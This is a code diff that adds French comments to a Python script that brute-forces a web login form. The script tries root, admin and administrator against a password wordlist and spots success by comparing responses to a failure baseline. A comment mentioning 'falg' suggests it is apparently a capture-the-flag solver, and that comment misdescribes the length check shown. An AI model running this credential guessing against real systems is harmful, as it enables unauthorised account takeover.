@@ -16,12 +16,12 @@ DEFAULT_WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
 USERNAMES = ["root", "admin", "administrator"]
 LOGIN_PARAMS = {"Login": "Login"}
 
-
+# Ouvre le fichier de mots de passe
 def load_wordlist(path: str) -> list[str]:
     with open(path) as f:
         return [line.strip() for line in f if line.strip()]
 
-
+# établir une référence d'échec
 def probe_failure() -> tuple[int, str]:
     params = dict(LOGIN_PARAMS, username="___nonexistent___", password="___wrong___")
     url = TARGET + "&" + urllib.parse.urlencode(params)
@@ -30,6 +30,7 @@ def probe_failure() -> tuple[int, str]:
     return len(body), body.decode(resp.headers.get_content_charset() or "utf-8")
 
 
+# Test le login
 def try_login(username: str, password: str) -> tuple[int, str]:
     params = dict(LOGIN_PARAMS, username=username, password=password)
     url = TARGET + "&" + urllib.parse.urlencode(params)
@@ -37,7 +38,7 @@ def try_login(username: str, password: str) -> tuple[int, str]:
     body = resp.read()
     return len(body), body.decode(resp.headers.get_content_charset() or "utf-8")
 
-
+# VErifie si la reponse de  la requete contien "falg"
 def is_success(fail_len: int, fail_body: str, body_len: int, body: str) -> bool:
     if body_len != fail_len:
         return True
@@ -50,6 +51,7 @@ def main() -> None:
     wordlist_path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_WORDLIST
 
     print("[*] Probing failure response …", flush=True)
+    # répartit automatiquement les deux valeurs
     fail_len, fail_body = probe_failure()
     print(f"[*] Failure baseline: {fail_len} bytes", flush=True)
 
